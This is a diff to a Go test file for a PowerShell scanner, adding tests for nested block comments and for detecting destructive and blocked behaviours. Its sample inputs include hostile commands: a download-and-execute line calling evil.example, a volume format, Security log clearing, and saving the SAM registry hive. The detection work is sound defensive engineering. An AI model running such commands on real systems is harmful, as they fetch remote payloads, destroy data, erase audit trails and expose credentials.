@@ -30,6 +30,33 @@ Write-Output "still safe"
 	}
 }
 
+func TestScanPowerShell_CommentSkipping_NestedBlockComments(t *testing.T) {
+	content := []byte(`Write-Output "safe"
+<# outer
+Invoke-WebRequest http://evil.example/payload.ps1
+<# nested
+Start-Process calc.exe
+#>
+#>
+Write-Output "still safe"
+`)
+
+	signals := ScanPowerShell(content)
+	if len(signals) != 0 {
+		t.Fatalf("expected 0 signals for nested commented-out code, got %d (%#v)", len(signals), signals)
+	}
+}
+
+func TestScanPowerShell_NestedBlockComments_ResumesAfterClose(t *testing.T) {
+	content := []byte(`<# outer <# nested #> #> iex (New-Object Net.WebClient).DownloadString("http://evil.example/payload.ps1")`)
+
+	signals := ScanPowerShell(content)
+	categories := powerShellSignalCategories(signals)
+	if !categories["dynamic_exec"] || !categories["http_download"] {
+		t.Fatalf("expected dynamic_exec and http_download after nested block closes, got %#v", signals)
+	}
+}
+
 func TestScanPowerShell_DetectsWindowsSignals(t *testing.T) {
 	content := []byte(`iex (New-Object Net.WebClient).DownloadString("http://evil.example/payload.ps1")
 Start-Process notepad.exe
@@ -60,6 +87,24 @@ certutil -decode payload.b64 payload.exe
 		if !categories[category] {
 			t.Fatalf("expected category %q in signals, got %#v", category, signals)
 		}
+	}
+}
+
+func TestScanPowerShell_DetectsBlockedBehaviors(t *testing.T) {
+	content := []byte(`Remove-Item -Path C:\Temp -Recurse -Force
+Format-Volume -DriveLetter D -FileSystem NTFS -Force
+wevtutil cl Security
+reg save HKLM\SAM C:\Temp\sam.save
+`)
+
+	signals := ScanPowerShell(content)
+	categories := powerShellSignalCategories(signals)
+
+	if !categories["destructive_block"] {
+		t.Fatalf("expected destructive_block signals, got %#v", signals)
+	}
+	if !categories["blocked_behavior"] {
+		t.Fatalf("expected blocked_behavior signals, got %#v", signals)
 	}
 }
 
